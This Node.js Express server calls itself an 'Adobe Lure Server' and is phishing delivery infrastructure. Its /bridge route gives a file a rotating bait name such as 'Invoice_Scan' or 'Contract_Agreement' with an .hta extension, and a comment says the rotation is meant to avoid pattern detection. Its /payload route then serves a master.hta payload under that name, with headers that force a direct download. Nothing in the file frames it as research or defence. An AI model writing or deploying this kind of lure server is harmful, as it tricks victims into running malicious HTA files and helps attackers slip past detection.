const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// Serve static files (index.html, confirm.html) from /public
app.use(express.static('public'));

// 1. THE BRIDGE: Generates a unique filename and redirects to confirm page
app.get('/bridge', (req, res) => {
    // Generate cryptographically secure random ID
    const randomId = crypto.randomInt(100000, 999999);
    
    // Rotate through themed names to avoid pattern detection
    const themes = ['Adobe_Document', 'Contract_Agreement', 'Invoice_Scan', 'Policy_Update', 'Secure_Form'];
    const theme = themes[Math.floor(Math.random() * themes.length)];
    const uniqueName = `${theme}_${randomId}.hta`;
    
    // Redirect to confirmation page with the unique name
    res.redirect(`/confirm.html?file=${encodeURIComponent(uniqueName)}`);
});

// 2. THE PAYLOAD ENDPOINT: Serves master.hta but forces unique download name
app.get('/payload/:filename', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'master.hta');
    
    // Verify file exists before attempting to send
    if (!fs.existsSync(filePath)) {
        return res.status(404).send('Payload not found.');
    }

    // CRITICAL HEADERS FOR DIRECT HTA DOWNLOAD
    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    res.setHeader('Content-Type', 'application/hta');
    res.setHeader('X-Content-Type-Options', 'nosniff'); // Prevents MIME sniffing
    
    // Stream the file efficiently
    res.sendFile(filePath);
});

// Health check endpoint (optional but useful for monitoring)
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(port, () => {
    console.log(`✅ Adobe Lure Server running on port ${port}`);
    console.log(`🔗 Bridge: http://localhost:${port}/bridge`);
});
